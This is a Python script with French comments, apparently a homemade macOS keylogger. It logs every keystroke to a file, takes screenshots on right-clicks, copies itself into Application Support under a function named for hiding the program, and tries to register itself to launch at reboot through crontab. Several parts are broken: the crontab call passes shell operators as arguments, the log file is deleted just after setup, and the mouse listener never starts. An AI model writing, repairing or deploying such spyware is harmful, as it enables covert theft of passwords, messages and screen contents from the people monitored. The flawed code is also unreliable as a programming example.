import time
import datetime
import subprocess
import os
import shutil
import sys
from pynput.keyboard import Key, Listener
from pynput import mouse

# Fonction pour capturer une image de l'écran
def capture_ecran():
    # Utilisation de la commande "screencapture" pour capturer l'écran
    subprocess.call(['screencapture', 'capture.png'])
    # Renommer l'image avec la date et l'heure actuelles
    now = datetime.datetime.now()
    os.rename('capture.png', str(now) + '.png')

# Fonction pour surveiller l'activité du clavier
def surveiller_clavier(key):
    # Si la touche pressée est "esc", on arrête le programme
    if key == Key.esc:
        return False
    else:
        # Sinon, on enregistre la touche pressée dans le fichier "log.txt"
        with open("log.txt", "a") as f:
            f.write(str(key))
            f.write("\n")

# Fonction pour surveiller l'activité de la souris
def surveiller_souris(x, y, button, pressed):
    # Si le bouton droit de la souris est pressé, on capture une image de l'écran
    if button == mouse.Button.right and pressed:
        capture_ecran()

# Fonction pour copier le programme dans un autre emplacement et le lancer au démarrage
def cacher_programme():
    # Copier le programme dans le dossier "Application Support"
    path = os.path.expanduser("~/Library/Application Support/")
    shutil.copy(sys.argv[0], path)
    # Créer un fichier de script pour lancer le programme au démarrage
    script = """#!/bin/sh
    cd {}
    python {} &""".format(path, os.path.join(path, sys.argv[0]))
    # Enregistrer le script dans le fichier "launchd.sh"
    with open('launchd.sh', 'w') as f:
        f.write(script)
    # Utiliser la commande "crontab" pour lancer le script au démarrage
    subprocess.call(['crontab', '-l', '&&', 'echo', '@reboot', path + 'launchd.sh', '|', 'crontab', '-'])
    # Supprimer le script et le fichier de log
    os.remove('launchd.sh')
    os.remove('log.txt')

# Fonction principale
def main():
    # Copier le programme dans un autre emplacement et le lancer au démarrage
    cacher_programme()
    # Lancer la surveillance du clavier et de la souris
    with Listener(on_press=surveiller_clavier) as listener:
        listener.join()
    with mouse.Listener(on_click=surveiller_souris) as listener:
        listener.join()

if __name__ == '__main__':
    main()